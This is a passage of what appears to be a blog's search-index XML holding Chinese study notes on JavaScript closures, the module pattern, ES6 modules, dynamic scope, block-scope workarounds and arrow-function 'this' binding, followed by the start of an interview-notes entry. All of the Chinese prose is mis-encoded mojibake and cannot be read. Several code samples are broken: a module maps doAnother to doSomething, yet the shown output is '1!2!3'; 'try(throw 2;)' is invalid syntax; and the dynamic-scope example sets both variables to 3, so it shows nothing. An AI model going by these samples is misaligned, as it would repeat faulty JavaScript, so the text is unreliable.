çš„ç‹¬ç«‹çš„æ¨¡å—åˆ›å»ºå™¨ï¼Œå¯ä»¥è¢«è°ƒç”¨ä»»æ„å¤šæ¬¡ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ¨¡å¼å®žä¾‹ã€‚å½“åªéœ€è¦ä¸€ä¸ªå®žä¾‹æ—¶ï¼Œå¯ä»¥å¯¹è¿™ä¸ªæ¨¡å¼è¿›è¡Œç®€å•çš„æ”¹è¿›å®žçŽ°å•ä¾‹æ¨¡å¼ï¼š 1234567891011121314151617var foo = (function CoolModule()&#123; var something = "cool"; var another = [1,2,3]; function doSomething()&#123; console.log(something); &#125; function doAnother()&#123; console.log(another.join("!")); &#125; return &#123; doSomething:doSomething, doAnother:doSomething &#125;&#125;)();foo.doSomething(); // cool foo.doAnother(); // 1!2!3 æˆ‘ä»¬å°†æ¨¡å—å‡½æ•°è½¬æ¢æˆäº† IIFE ï¼Œç«‹å³è°ƒç”¨è¿™ä¸ªå‡½æ•°å¹¶è¿”å›žå€¼ç›´æŽ¥èµ‹å€¼ç»™å•ä¾‹çš„æ¨¡å—å®žä¾‹æ ‡è¯†ç¬¦ foo ã€‚ æ¨¡å—ä¹Ÿæ™®é€šå‡½æ•°ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥æŽ¥å—å‚æ•°ï¼š 123456789101112function CoolModule(id)&#123; function identify()&#123; console.log(id); &#125; return&#123; identify:identify &#125;&#125;var foo1 = CoolModule("foo 1");var foo2 = CoolModule("foo 2");foo1.identify(); // "foo 1"foo2.identify(); // "foo 2" æ¨¡å—æ¨¡å¼å¦ä¸€ä¸ªç®€å•ä½†å¼ºå¤§çš„ç”¨æ³•æ˜¯å‘½åå°†è¦ä½œä¸ºå…¬å…± API è¿”å›žçš„å¯¹è±¡ï¼š 123456789101112131415161718192021var foo = (function CoolModule(id)&#123; function change()&#123; // ä¿®æ”¹å…¬å…± API publicAPI.identify = identify2; &#125; function identify()&#123; console.log(id); &#125; function identify2()&#123; console.log(id.toUpperCase()); &#125; var publicAPI = &#123; change:change, identify:identify &#125; return publicAPI&#125;)("foo module");foo.identify(); // foo modulefoo.change();foo.identify(); // FOO MODULE é€šè¿‡åœ¨æ¨¡å—å®žä¾‹çš„å†…éƒ¨ä¿ç•™å¯¹å…¬å…± API å¯¹è±¡çš„å†…éƒ¨å¼•ç”¨ï¼Œå¯ä»¥ä»Žå†…éƒ¨å¯¹æ¨¡å—å®žä¾‹è¿›è¡Œä¿®æ”¹ï¼ŒåŒ…æ‹¬æ·»åŠ æˆ–åˆ æ–¹æ³•å’Œå±žæ€§ï¼Œä»¥åŠä¿®æ”¹å®ƒä»¬çš„å€¼ã€‚ çŽ°ä»£çš„æ¨¡å—æœºåˆ¶å¤§å¤šæ•°æ¨¡å—ä¾èµ–åŠ è½½å™¨/ç®¡ç†å™¨æœ¬è´¨ä¸Šéƒ½æ˜¯è®²è¿™ç§æ¨¡å—å®šä¹‰å°è£…è¿›ä¸€ä¸ªå‹å¥½çš„ API ï¼Œè¿™é‡Œå¹¶ä¸ä¼šç ”ç©¶æŸä¸ªå…·ä½“çš„åº“ï¼Œè®²ä¸€äº›æ ¸å¿ƒæ¦‚å¿µï¼š 12345678910111213141516var MyModule = (function Manager()&#123; var modules = &#123;&#125;; function define(name,deps,impl)&#123; for(var i = 0; i &lt; deps.length; i++)&#123; deps[i] = modules[deps[i]]; &#125; modules[name] = impl.apply(impl,deps); &#125; function get(name)&#123; return modules[name]; &#125; return&#123; define:define, get:get &#125;&#125;)(); è¿™æ®µä»£ç çš„æ ¸å¿ƒæ˜¯ modules[name] = impl.apply(impl,deps); ä¸ºäº†æ¨¡å—çš„å¦ä¸€å¼•å…¥äº†åŒ…è£…å‡½æ•°ï¼ˆå¯ä»¥ä¼ å…¥ä»»ä½•ä¾èµ–ï¼‰ï¼Œå¹¶ä¸”å°†è¿”å›žå€¼ï¼Œä¹Ÿå°±æ˜¯æ¨¡å—çš„ API ï¼Œå­˜å‚¨åœ¨ä¸€ä¸ªæ ¹æ®åå­—æ¥ç®¡ç†çš„æ¨¡å—åˆ—è¡¨ä¸­ã€‚ ä¸‹é¢å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨å®ƒæ¥å®šä¹‰æ¨¡å—ï¼š 123456789101112131415161718192021222324MyModule.define("bar",[],function()&#123; function hello(who)&#123; return `Let me introduce: $&#123;who&#125;` &#125; return &#123; hello:hello &#125;&#125;);MyModule.define("foo",["bar"],function(bar)&#123; var hungry = "hippo"; function awesome()&#123; console.log(bar.hello(hungry).toUpperCase()); &#125; return&#123; awesome:awesome &#125;&#125;);var bar = MyModule.get("bar");var foo = MyModule.get("foo");console.log(bar.hello('hippo')); //Let me introduce:hippofoo.awesome(); //LET ME INTRODUCE:HIPPO â€œfooâ€å’Œâ€œbarâ€æ¨¡å—éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªè¿”å›žå…¬å…± API çš„å‡½æ•°æ¥å®šä¹‰çš„ã€‚â€œfooâ€ç”šè‡³æŽ¥å—â€œbarâ€çš„å®žä¾‹ä½œä¸ºä¾èµ–å‚æ•°ï¼Œå¹¶èƒ½ç›¸åº”åœ°ä½¿ç”¨å®ƒã€‚ æ¨¡å—å°±æ˜¯æ¨¡å—ï¼Œå³ä½¿åœ¨å®ƒä»¬å¤–å±‚åŠ ä¸Šä¸€ä¸ªå‹å¥½çš„åŒ…è£…åŠŸèƒ½ä¹Ÿä¸ä¼šå‘ç”Ÿä»»ä½•å˜åŒ–ã€‚ æœªæ¥ï¼ˆæˆ–çŽ°åœ¨ï¼‰çš„æ¨¡å—æœºåˆ¶ES6 ä¸ºæ¨¡å—å¢žåŠ äº†ä¸€ä¸€çº§è¯­æ³•æ”¯æŒï¼Œåœ¨åŒä¸ªæ¨¡å—ç³»ç»Ÿè¿›è¡ŒåŠ è½½çš„æ—¶å€™ï¼ŒES6ä¼šå°†æ–‡ä»¶å½“åšç‹¬ç«‹çš„æ¨¡å—æ¥å¤„ç†ã€‚æ¯ä¸ªæ¨¡å—éƒ½å¯ä»¥å¯¼å…¥å…¶ä»–æ¨¡å—æˆ–è€…ç‰¹å®šçš„ APIæˆå‘˜ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥å¯¼å‡ºè‡ªå·±çš„ API æˆå‘˜ã€‚ åŸºäºŽå‡½æ•°çš„æ¨¡å—å¹¶ä¸æ˜¯ä¸€ä¸ªèƒ½å¤Ÿé™æ€è¯†åˆ«çš„æ¨¡å¼ï¼ˆç¼–è¾‘å™¨æ— æ³•è¯†åˆ«ï¼‰ï¼Œå®ƒä»¬çš„ API è¯­ä¹‰åªæœ‰åœ¨è¿è¡Œæ—¶æ‰ä¼šè¢«è€ƒè™‘è¿›æ¥ï¼Œå› ä¸ºå¯ä»¥åœ¨è¿è¡Œæ—¶ä¿®æ”¹ä¸€ä¸ªæ¨¡å—çš„ APIã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒES6 æ¨¡å— API æ˜¯é™æ€çš„ï¼ˆAPI ä¸ä¼šåœ¨è¿è¡Œæ—¶æ”¹å˜ï¼‰ã€‚ç”±äºŽç¼–è¾‘å™¨çŸ¥é“è¿™ä¸€ç‚¹ï¼Œå› ä¸ºå¯ä»¥åœ¨ç¼–è¯‘æœŸæ£€æŸ¥å¯¹å¯¼å…¥æ¨¡å—çš„ API æˆå‘˜çš„å¼•ç”¨æ˜¯å¦çœŸå®žå­˜åœ¨ï¼Œå¦‚æžœ API å¼•ç”¨å¹¶ä¸å­˜åœ¨ï¼Œç¼–è¯‘å™¨ä¼šåœ¨ç¼–è¯‘æ—¶å°±æŠ›å‡ºâ€æ—©æœŸâ€œé”™è¯¯ï¼Œè€Œä¸æ˜¯ç­‰åˆ°è¿è¡Œæ—¶å†åŠ¨æ€è§£æžï¼ˆå¹¶ä¸”æŠ¥é”™ï¼‰ ES6 çš„æ¨¡å—æ²¡æœ‰ â€œè¡Œå†…â€æ ¼å¼ï¼Œå¿…é¡»å®šä¹‰åœ¨ç‹¬ç«‹çš„æ–‡ä»¶ä¸­ï¼ˆä¸€ä¸ªæ–‡ä»¶ä¸€ä¸ªæ¨¡å—ï¼‰ã€‚æµè§ˆå™¨æˆ–å¼•èµ·ä¸€ä¸ªé»˜è®¤çš„â€œæ¨¡å—åŠ è½½å™¨â€ï¼ˆå¯ä»¥è¢«é‡è½½ï¼‰å¯ä»¥åœ¨å¯¼å…¥æ¨¡å—æ—¶åŒæ—¶åŠ è½½æ–‡ä»¶ã€‚ä¸¾ä¸ªä¾‹å­ï¼š 123456789101112131415161718192021// bar.jsfunction hello(who)&#123; return "Let me introduce:" + who;&#125;export hello;// foo.js// ä»…ä»Žâ€œbarâ€æ¨¡å—å¯¼å…¥ hello()import hello from "bar";var hungry = "hippo";function awesome()&#123; console.log(hello(hungry).toUpperCase());&#125;export awesome;//baz.js// å¯¼å…¥å®Œæ•´çš„ â€œfooâ€ å’Œ â€œbarâ€æ¨¡å—module foo from "foo";module bar from "bar";console.log("rhino");foo.awesome(); import å¯ä»¥å°†ä¸€ä¸ªæ¨¡å—ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ª API å¯¼å…¥åˆ°å½“å‰ä½œç”¨åŸŸä¸­ï¼Œå¹¶åˆ†åˆ«ç»‘å®šåœ¨ä¸€ä¸ªå˜é‡ä¸Šã€‚module ä¼šå°†æ•´ä¸ªæ¨¡å—çš„ API å¯¼å…¥å¹¶ç»‘å®šåˆ°ä¸€ä¸ªå˜é‡ä¸Šï¼ˆfoo,barï¼‰ã€‚export ä¼šå°†å½“æœŸæ¨¡å—çš„ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼ˆå˜é‡ã€‚å‡½æ•°ï¼‰å¯¼å‡ºä¸ºå…¬å…± APIï¼Œè¿™äº›æ“ä½œå¯ä»¥åœ¨æ¨¡å—å®šä¹‰ä¸­æ ¹æ®éœ€è¦ä½¿ç”¨ä»»æ„å¤šæ¬¡ã€‚ æ¨¡å—æ–‡ä»¶ä¸­çš„å†…å®¹ä¼šè¢«å½“åšåŒ…å«åœ¨ä½œç”¨åŸŸé—­åŒ…ä¸­ä¸€æ ·æ¥å¤„ç†ï¼Œå°±è·Ÿå‰é¢ä»‹ç»çš„å‡½æ•°é—­åŒ…æ¨¡å—ä¸€æ ·ã€‚ å°ç»“å½“å‡½æ•°å¯ä»¥è®°ä½å¹¶è®¿é—®æ‰€åœ¨çš„è¯æ³•ä½œç”¨åŸŸï¼Œå³ä½¿å‡½æ•°æ˜¯åœ¨å½“å‰è¯æ³•ä½œç”¨åŸŸä¹‹å¤–æ‰§è¡Œï¼Œè¿™æ—¶å°±äº§ç”Ÿäº† é—­åŒ…ã€‚ åœ¨å¾ªçŽ¯ä¸­ï¼Œé—­åŒ…æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥ç”¨å¤šç§å½¢å¼æ¥å®žçŽ°æ¨¡å—ç­‰æ¨¡å¼ã€‚ æ¨¡å—æœ‰ä¸¤ä¸ªä¸»è¦çš„ç‰¹å¾ï¼šï¼ˆ1ï¼‰ä¸ºåˆ›å»ºå†…éƒ¨ä½œç”¨åŸŸè€Œè°ƒç”¨äº†ä¸€ä¸ªåŒ…è£…å‡½æ•°ï¼›ï¼ˆ2ï¼‰åŒ…è£…å‡½æ•°çš„è¿”å›žå€¼è‡³å°‘åŒ…å«ä¸€ä¸ªå¯¹å†…éƒ¨å‡½æ•°çš„å¼•ç”¨ï¼Œè¿™æ ·å°±å¯ä»¥åˆ›å»ºæ¶µç›–æ•´ä¸ªåŒ…è£…å‡½æ•°å†…éƒ¨ä½œç”¨åŸŸçš„é—­åŒ…ã€‚ é™„å½•åŠ¨æ€ä½œç”¨åŸŸæ¯”å¯¹äº†åŠ¨æ€ä½œç”¨å’Œè¯æ³•ä½œç”¨åŸŸæ¨¡åž‹ï¼ŒJavaScript ä¸­çš„ä½œç”¨åŸŸå°±æ˜¯è¯æ³•ä½œç”¨åŸŸï¼ˆäº‹å®žä¸Šå¤§éƒ¨åˆ†è¯­è¨€éƒ½æ˜¯åŸºäºŽè¯æ³•ä½œç”¨åŸŸçš„ï¼‰ã€‚ ä¸‹é¢ç®€è¦åˆ†æžä¸€ä¸‹åŠ¨æ€ä½œç”¨åŸŸï¼Œé‡ç”³å®ƒä¸Žè¯æ³•ä½œç”¨åŸŸçš„åŒºåˆ«ï¼Œä½†å®žé™…ä¸ŠåŠ¨æ€ä½œç”¨åŸŸæ˜¯ JavaScript å¦ä¸€ä¸ªé‡è¦çš„æœºåˆ¶ this æ ‡ç­¾ã€‚ è¯æ³•ä½œç”¨åŸŸæ˜¯ä¸€å¥—åŸºäºŽå¼•æ“Žå¦‚ä½•å¯»æ‰¾å˜é‡å·²ç»ä¼šåœ¨ä½•å¤„æ‰¾åˆ°å˜é‡çš„è§„åˆ™ã€‚è¯æ³•ä½œç”¨åŸŸæœ€é‡è¦çš„ç‰¹æ€§æ˜¯å®ƒçš„å®šä¹‰è¿‡ç¨‹å‘ç”Ÿä»£ç çš„ä¹¦å†™é˜¶æ®µï¼ˆå‡è®¾ä½ æ²¡æœ‰ä½¿ç”¨ eval() æˆ–è€… withï¼‰ åŠ¨æ€ä½œç”¨åŸŸä¼¼ä¹Žæš—ç¤ºæœ‰å¾ˆå¥½çš„ç†ç”±è®©ä½œç”¨åŸŸä½œä¸ºä¸€ä¸ªåœ¨è¿è¡Œæ—¶å°±è¢«åŠ¨æ€ç¡®å®šçš„å½¢å¼ï¼Œè€Œä¸æ˜¯åœ¨å†™ä»£ç æ—¶è¿›è¡Œé™æ€ç¡®å®šçš„å½¢å¼ï¼Œäº‹å®žä¸Šä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬é€šè¿‡å®žä¾‹ä»£ç æ¥è¯´æ˜Žï¼š 123456789function foo()&#123; console.log(a);&#125;function bar()&#123; var a = 3; foo();&#125;var a = 2;bar(); è¯æ³•ä½œç”¨åŸŸè®© foo() ä¸­çš„ a é€šè¿‡ RHS å¼•ç”¨åˆ°äº†å…¨å±€ä½œç”¨åŸŸä¸­çš„ a ,å› æ­¤ä¼šè¾“å‡º 2ã€‚ è€ŒåŠ¨æ€ä½œç”¨åŸŸå¹¶ä¸å…³å¿ƒå‡½æ•°å’Œä½œç”¨åŸŸæ˜¯å¦‚ä½•å£°æ˜Žä»¥åŠåœ¨ä½•å¤„å£°æ˜Žçš„ã€‚åªå…³å¿ƒå®ƒä»¬ä»Žä½•å¤„è°ƒç”¨ã€‚æ¢å¥è¯è¯´ï¼Œä½œç”¨åŸŸé“¾æ˜¯åŸºäºŽæ ˆçš„ï¼Œè€Œä¸æ˜¯ä»£ç ä¸­çš„ä½œç”¨åŸŸåµŒå¥—ã€‚ å› æ­¤ï¼Œå¦‚æžœ JavaScript å…·æœ‰åŠ¨æ€ä½œç”¨åŸŸï¼Œç†è®ºä¸Šï¼Œä¸‹é¢ä»£ç ä¸­çš„ foo() åœ¨æ‰§è¡Œæ—¶å°†ä¼šè¾“å‡º 3 123456789function foo()&#123; console.log(a); //3&#125;function bar()&#123; var a = 3; foo();&#125;var a = 3;bar(); ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå› ä¸ºå½“ foo ()æ— æ³•æ‰¾åˆ° a å˜é‡å¼•ç”¨æ—¶ï¼Œä¼šé¡ºç€è°ƒç”¨æ ˆåœ¨è°ƒç”¨ foo() çš„åœ°æ–¹æŸ¥æ‰¾ a ï¼Œè€Œä¸æ˜¯åœ¨åµŒå¥—çš„è¯æ³•ä½œç”¨åŸŸé“¾ä¸­å‘ä¸ŠæŸ¥æ‰¾ï¼Œç”±äºŽ foo() æ˜¯åœ¨ bar() ä¸­è°ƒç”¨çš„ï¼Œå¼•æ“Žä¼šæ£€æŸ¥ bar() çš„ä½œç”¨åŸŸï¼Œå¹¶åœ¨å…¶ä¸­æ‰¾åˆ°å€¼ä¸º3çš„å˜é‡ a. éœ€è¦æ˜Žç¡®çš„æ˜¯ JavaScript å¹¶ä¸å…·æœ‰åŠ¨æ€ä½œç”¨åŸŸï¼Œå®ƒåªæœ‰è¯æ³•ä½œç”¨åŸŸï¼Œä½†æ˜¯ this æœºåˆ¶æŸç§ç¨‹åº¦ä¸Šå¾ˆåƒåŠ¨æ€ä½œç”¨åŸŸã€‚ ä¸»è¦åŒºåˆ«ï¼šè¯æ³•ä½œç”¨åŸŸæ˜¯åœ¨å†™ä»£ç æˆ–è€…è¯´å®šä¹‰æ—¶ç¡®å®šçš„ï¼Œè€ŒåŠ¨æ€ä½œç”¨åŸŸæ˜¯åœ¨è¿è¡Œæ—¶ç¡®å®šçš„ã€‚ï¼ˆthisä¹Ÿæ˜¯ï¼‰æ‰å‘ä½œç”¨åŸŸå…³æ³¨å‡½æ•°åœ¨ä½•å¤„å£°æ˜Žï¼Œè€ŒåŠ¨æ€ä½œç”¨åŸŸå…³æ³¨å‡½æ•°ä»Žä½•å¤„è°ƒç”¨ã€‚ æœ€åŽï¼Œthis å…³æ³¨å‡½æ•°å¦‚ä½•è°ƒç”¨ï¼Œè¿™å°±è¡¨æ˜Žäº† this æœºåˆ¶å’ŒåŠ¨æ€ä½œç”¨åŸŸä¹‹é—´å…³ç³»çš„ç´§å¯†ã€‚ å—ä½œç”¨åŸŸçš„æ›¿ä»£æ–¹æ¡ˆå¦‚æžœæˆ‘ä»¬æƒ³åœ¨ ES6 ä¹‹å‰çŽ¯å¢ƒä¸­ä½¿ç”¨å—çº§ä½œç”¨åŸŸï¼Ÿ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345&#123; let a = 2; console.log(a); // 2&#125;console.log(a); //ReferenceError è¿™æ®µä»£ç åœ¨ ES6 çŽ¯å¢ƒä¸­å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯ä¹‹å‰çš„çŽ¯å¢ƒæ€Žä¹ˆå®žçŽ°è¿™ä¸ªæ•ˆæžœå‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ç”¨ catch 1234try(throw 2;)catch(a)&#123; console.log(a); // 2&#125;console.log(a); // ReferenceError æˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªä¼šå¼ºåˆ¶æŠ›å‡ºé”™è¯¯çš„ try/catch ï¼Œä½†æ˜¯å®ƒæŠ›å‡ºçš„é”™è¯¯å°±æ˜¯ä¸€ä¸ªå€¼2ï¼Œç„¶åŽ catch åˆ†å¥ä¸­çš„å˜é‡å£°æ˜Žä¼šæŽ¥å—è¿™ä¸ªå€¼ã€‚å¦å¤–è¿˜å¯ä»¥ä½¿ç”¨ä»£ç å·¥å…·æ¥åšå¤„ç† TraceurGoogle ç»´æŠ¤è€…ä¸€ä¸ªåä¸º Traceur çš„é¡¹ç›®ï¼Œè¯¥é¡¹ç›®æ­£æ˜¯ç”¨æ¥å°† ES6 ä»£ç è½¬æ¢æˆå…¼å®¹ ES6 ä¹‹é—´çš„çŽ¯å¢ƒï¼ˆå¤§æŒ‡çš„æ˜¯ ES5ï¼Œä½†ä¸æ˜¯å…¨éƒ¨ï¼‰ã€‚ä¸‹é¢æ˜¯è½¬æ¢çš„ä»£ç çš„æ ·å­ï¼š 123456789&#123; try&#123; throw undefined; &#125;catch(a)&#123; a = 2; console.log(a); &#125;&#125;console.log(a); é€šè¿‡ä½¿ç”¨è¿™æ ·çš„å·¥å…·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä½¿ç”¨å—ä½œç”¨åŸŸæ—¶æ— éœ€è€ƒè™‘ç›®æ ‡å¹³å°æ˜¯å¦æ˜¯ ES6çŽ¯å¢ƒï¼Œå› ä¸º try/catch ä»Ž ES3å¼€å§‹å°±å­˜åœ¨äº†ï¼ˆå¹¶ä¸”ä¸€ç›´æ˜¯è¿™æ ·å·¥ä½œçš„ï¼‰ éšå¼å’Œæ˜¾å¼ä½œç”¨åŸŸ1234let (a = 2)&#123; console.log(a); // 2&#125;console.log(a); //ReferenceError åŒéšå¼åœ°åŠ«æŒä¸€ä¸ªå·²ç»å­˜åœ¨çš„ä½œç”¨åŸŸä¸åŒï¼Œlet å£°æ˜Žä¼šåˆ›å»ºä¸€ä¸ªæ˜¾ç¤ºçš„ä½œç”¨åŸŸä¸Žå…¶è¿›è¡Œç»‘å®šã€‚æ˜¾å¼ä½œç”¨åŸŸä¸ä»…æ›´åŠ çªå‡ºï¼Œåœ¨ä»£ç é‡æž„ä¹Ÿè¡¨çŽ°å¾—æ›´åŠ å¥å£®ã€‚åœ¨è¯­æ³•ä¸Šï¼Œé€šè¿‡å¼ºåˆ¶æ€§åœ°å°†æ‰€æœ‰å˜é‡å£°æ˜Žæå‡åˆ°å—çš„é¡¶éƒ¨æ¥äº§ç”Ÿæ›´ç®€æ´çš„ä»£ç ï¼Œè¿™æ ·æ›´å®¹æ˜“åˆ¤æ–­å˜é‡æ˜¯å¦å±žäºŽæŸä¸ªä½œç”¨åŸŸã€‚ è¿™ç§æ¨¡å¼åŒå¾ˆå¤šäººåœ¨å‡½æ•°ä½œç”¨åŸŸä¸­æ‰‹åŠ¨å°† var å£°æ˜Žæå‡åˆ°å‡½æ•°é¡¶éƒ¨çš„æ–¹å¼å¾ˆæŽ¥è¿‘ã€‚let å£°æ˜Žæœ‰æ„å°†å£°æ˜Žæ”¾åœ¨å—çš„é¡¶éƒ¨ï¼Œå¦‚æžœä½ å¹¶æ²¡æœ‰åˆ°å¤„ä½¿ç”¨ let å®šä¹‰ï¼Œé‚£ä¹ˆä½ å—ä½œç”¨åŸŸå°±å¾ˆå®¹æ˜“è¾¨è¯†å’Œç»´æŠ¤ã€‚ ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œlet å£°æ˜Žå¹¶ä¸åŒ…å«åœ¨ ES6 ä¸­ï¼Œå®˜æ–¹çš„ Traceur ç¼–è¾‘å™¨ä¹Ÿä¸æŽ¥å—è¿™ä¸­å½¢å¼çš„ä»£ç ï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä½¿ç”¨åˆæ³•çš„ES6 ä»£ç å¹¶ä¸”åœ¨ä»£ç è§„èŒƒä¸Šåšä¸€äº›å¦¥å 12345/*let*/&#123; let a = 2; console.log(a);&#125;console.log(a); // ReferenceError æ€§èƒ½try/catch çš„æ€§èƒ½çš„ç¡®å¾ˆç³Ÿç³•ã€‚å› ä¸ºå°†ä¸€æ®µä»£ç çš„ä»»æ„ä¸€éƒ¨åˆ†æ‹¿å‡ºæ¥ç”¨å‡½æ•°è¿›è¡ŒåŒ…è£¹ï¼Œä¼šæ”¹å˜è¿™æ®µä»£ç çš„å«ä¹‰ï¼Œå…¶ä¸­çš„ this/return/breakå’Œ continue éƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚IIFE å¹¶ä¸æ˜¯ä¸€ä¸ªæ™®é€‚çš„è§£å†³æ–¹æ¡ˆï¼Œå®ƒåªé€‚åˆåœ¨æŸäº›æƒ…å†µä¸‹è¿›è¡Œæ‰‹åŠ¨æ“ä½œã€‚ this è¯æ³•ES6 æ·»åŠ äº†ä¸€ä¸ªç‰¹æ®Šè¯­æ³•å½¢å¼ç”¨äºŽå‡½æ•°è¯´æ˜Žï¼Œå«åšç®­å¤´å‡½æ•°ï¼š 1234var foo = a =&gt;&#123; console.log(a);&#125;foo(2) // 2 ç®­å¤´é€šå¸¸è¢«å½“ä½œ function å…³é”®å­—çš„ç¼©å†™ã€‚ 12345678910var obj = &#123; id:"awesome", cool:function coolFn()&#123; console.log(this.id); &#125;&#125;var id = "not awesome";obj.cool(); // awesomesetTimeout(obj.cool,100); // not awesome é—®é¢˜åœ¨äºŽ cool() å‡½æ•°ä¸¢å¤±åŒ this ä¹‹é—´çš„ç»‘å®šï¼Œè§£å†³è¿™ä¸ªé—®é¢˜æœ‰å‡ ç§æ–¹å¼ï¼Œä½†æ˜¯æœ€å¸¸ç”¨çš„æ˜¯ var self = this; 1234567891011121314var obj = &#123; count:0, cool:function coolFn()&#123; var self = this; if(self.count &lt; 1)&#123; setTimeout(function timer()&#123; self.count++; console.log("awesome?"); &#125;,100); &#125; &#125;&#125;obj.cool(); // awesome? var self = this è¿™ç§è§£å†³æ–¹æ¡ˆåœ†æ»¡è§£å†³äº†ç†è§£å’Œæ­£ç¡®ä½¿ç”¨ thisç»‘å®šçš„é—®é¢˜ï¼Œå¹¶æ²¡æœ‰æŠŠé—®é¢˜è¿‡äºŽå¤æ‚åŒ–ï¼Œå®ƒä½¿ç”¨çš„æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„å·¥å…·ï¼šè¯æ³•ä½œç”¨åŸŸã€‚self åªæ˜¯ä¸€ä¸ªå¯ä»¥é€šè¿‡è¯æ³•ä½œç”¨åŸŸå’Œé—­åŒ…è¿›è¡Œå¼•ç”¨çš„æ ‡è¯†ç¬¦ï¼Œä¸å…³å¿ƒ this ç»‘å®šçš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä»€ä¹ˆã€‚ ES6 ä¸­ç®­å¤´å‡½æ•°å¼•å…¥äº†ä¸€ä¸ªå«åš this è¯æ³•çš„è¡Œä¸ºï¼š 12345678910111213var obj = &#123; count:0, cool:function coolFn()&#123; if(this.count &lt; 1)&#123; setTimeout(()=&gt;&#123; this.count++; console.log("awesome?"); &#125;,100); &#125; &#125;&#125;obj.cool(); // awesome? ç®€å•åœ°æ¥è¯´ï¼Œç®­å¤´å‡½æ•°åœ¨æ¶‰åŠ this ç»‘å®šçš„è¡Œä¸ºå’Œæ™®é€šå‡½æ•°çš„è¡Œä¸ºå®Œå…¨ä¸ä¸€è‡´ã€‚å®ƒæ”¾å¼ƒäº†æ‰€æœ‰æ™®é€š thisç»‘å®šçš„è§„å®šï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å½“å‰çš„è¯æ³•ä½œç”¨åŸŸè¦†ç›–äº† this æœ¬æ¥çš„å€¼ã€‚ å› æ­¤ï¼Œä¸Šé¢çš„ä»£ç çš„ç®­å¤´å‡½æ•°å¹¶éžæ˜¯ä»¥æŸç§ä¸å¯é¢„æµ‹çš„æ–¹å¼åŒæ‰€å±žçš„ this è¿›è¡Œäº†è§£ç»‘å®šï¼Œè€Œåªæ˜¯â€œç»§æ‰¿â€ äº† cool å‡½æ•° çš„this ç»‘å®šï¼ˆå› æ­¤è°ƒç”¨å®ƒä¸ä¼šå‡ºé”™ï¼‰ å¦ä¸€ä¸ªå¯¼è‡´ç®­å¤´å‡½æ•°ä¸å¤Ÿç†æƒ³çš„åŽŸå› æ˜¯å®ƒä»¬çš„åŒ¿åå‡½æ•°è€Œéžæ˜¯å…·åçš„ã€‚å…·åå‡½æ•°æ¯”è¾ƒåŒ¿åå‡½æ•°æ›´å¯å–çš„åŽŸå› åœ¨å‰é¢æœ‰ä¸‰ç‚¹ã€‚ åœ¨ä½œè€…çœ‹æ¥ï¼Œè§£å†³è¿™ä¸ªé—®é¢˜çš„å¦ä¸€ä¸ªæ›´åˆé€‚çš„æ–¹å¼æ˜¯ï¼š 12345678910111213var obj = &#123; count:0, cool:function coolFn()&#123; if(this.count &lt; 1)&#123; setTimeout(function timer()&#123; this.count++; console.log("awesome?"); &#125;.bind(this),100); &#125; &#125;&#125;obj.cool(); // awesome?]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>ä½ ä¸çŸ¥é“çš„JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•é¢˜ç›®æ±‡æ€»æ‘˜å½•ï¼ˆJS åŸºç¡€ç¯‡ï¼‰]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-JS%20%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
    <content type="text"><![CDATA[æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œä¿æŒç©ºæ¯å¿ƒæ€ JS åŸºç¡€JavaScript çš„ typeof è¿”å›žé‚£äº›æ•°æ®ç±»åž‹object number function boolean undefined string 12345678910111213141516typeof null; *// object*typeof isNaN; *// function*typeof isNaN(123); *//boolean*typeof []; *// object*Array.isArray(); *// false*toString.call([]); *// [object Array]*var arr = [];arr.constructor; *// Æ’ Array() &#123; [native code] &#125;* å¼ºåˆ¶ç±»åž‹è½¬æ¢å’Œéšå¼ç±»åž‹è½¬æ¢ï¼Ÿæ˜¾ç¤ºè½¬æ¢ï¼ˆå¼ºåˆ¶ç±»åž‹è½¬æ¢ï¼‰js æä¾›äº†ä»¥ä¸‹å‡ ç§è½¬åž‹å‡½æ•°ï¼š è½¬æ¢çš„ç±»åž‹ å‡½æ•° æ•°å€¼ç±»åž‹ Number(mix),parseInt(string,radix),parseFloat(string); å­—ç¬¦ä¸²ç±»åž‹ toString(radix),String(mix) å¸ƒå°”ç±»åž‹ Boolean(mix) Numberï¼ˆmixï¼‰ å‡½æ•°ï¼Œå¯ä»¥å°†ä»»æ„ç±»åž‹çš„å‚æ•° mix è½¬æ¢ä¸ºæ•°å€¼ç±»åž‹ï¼Œè§„åˆ™ä¸º å¦‚æžœæ˜¯å¸ƒå°”å€¼ï¼Œtrue å’Œ falseåˆ†åˆ«è¢«è½¬æ¢ä¸º 1 å’Œ 0 å¦‚æžœæ˜¯æ•°å­—å€¼ï¼Œè¿”å›žæœ¬èº« å¦‚æžœæ˜¯ null,è¿”å›ž 0. å¦‚æžœæ˜¯ undefinedï¼Œè¿”å›ž NaN 